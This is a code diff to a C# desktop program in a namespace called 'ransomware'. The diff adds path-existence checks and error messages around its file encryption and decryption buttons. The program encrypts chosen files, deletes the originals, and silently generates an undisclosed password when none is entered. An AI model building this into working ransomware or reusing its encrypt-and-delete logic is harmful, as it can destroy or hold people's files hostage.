@@ -140,18 +140,29 @@ namespace ransomware
         private void btnEncrypt_Click(object sender, EventArgs e)
         {
 
-            string password = txtPassword.Text;
+            if (CheckPathExist(txtPath.Text))
+            {
 
-            //generate random password when txtPassword.Text is empty
-            if(txtPassword.Text == null || txtPassword.Text == "")
-                password = GeneratePassword();
+                string password = txtPassword.Text;
 
-            GCHandle gCHandle = GCHandle.Alloc(txtPassword.Text, GCHandleType.Pinned);
-            FileEncrypt(txtPath.Text, password);
-            ZeroMemory(gCHandle.AddrOfPinnedObject(), txtPassword.Text.Length * 2);
-            gCHandle.Free();
+                //generate random password when txtPassword.Text is empty
+                if (txtPassword.Text == null || txtPassword.Text == "")
+                    password = GeneratePassword();
 
-            MessageBox.Show("Encryption Done!");
+                GCHandle gCHandle = GCHandle.Alloc(txtPassword.Text, GCHandleType.Pinned);
+                FileEncrypt(txtPath.Text, password);
+                ZeroMemory(gCHandle.AddrOfPinnedObject(), txtPassword.Text.Length * 2);
+                gCHandle.Free();
+
+                MessageBox.Show("Encryption Done!");
+
+            }
+            else
+            {
+
+                MessageBox.Show(txtPath.Text + " Doesn't exist", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+
+            }
 
         }
 
@@ -230,6 +241,12 @@ namespace ransomware
                     File.Delete(file);
 
                 }
+                else
+                {
+
+                    MessageBox.Show(file + " Is not a encrypt file", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+
+                }
 
             }
 
@@ -238,12 +255,23 @@ namespace ransomware
         private void btnDescrypt_Click(object sender, EventArgs e)
         {
 
-            GCHandle gch = GCHandle.Alloc(txtPassword.Text, GCHandleType.Pinned);
-            FileDecrypt(txtPath.Text, txtPassword.Text);
+            if (CheckPathExist(txtPath.Text))
+            {
 
-            ZeroMemory(gch.AddrOfPinnedObject(), txtPassword.Text.Length * 2);
-            gch.Free();
-            MessageBox.Show("Decryption Done!");
+                GCHandle gch = GCHandle.Alloc(txtPassword.Text, GCHandleType.Pinned);
+                FileDecrypt(txtPath.Text, txtPassword.Text);
+
+                ZeroMemory(gch.AddrOfPinnedObject(), txtPassword.Text.Length * 2);
+                gch.Free();
+                MessageBox.Show("Decryption Done!");
+
+            }
+            else
+            {
+
+                MessageBox.Show(txtPath.Text + " Doesn't exist", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+
+            }
 
         }
 
@@ -280,9 +308,18 @@ namespace ransomware
 
             }
 
-            //MessageBox.Show("Generated password is:" sb.ToString());
+            //MessageBox.Show("Generated password is:" + sb.ToString());
 
             return sb.ToString();
+
+        }
+
+        private bool CheckPathExist(string path)
+        {
+
+            if (File.Exists(path)) return true;
+            else if (Directory.Exists(path)) return true;
+            else return false;
 
         }
 
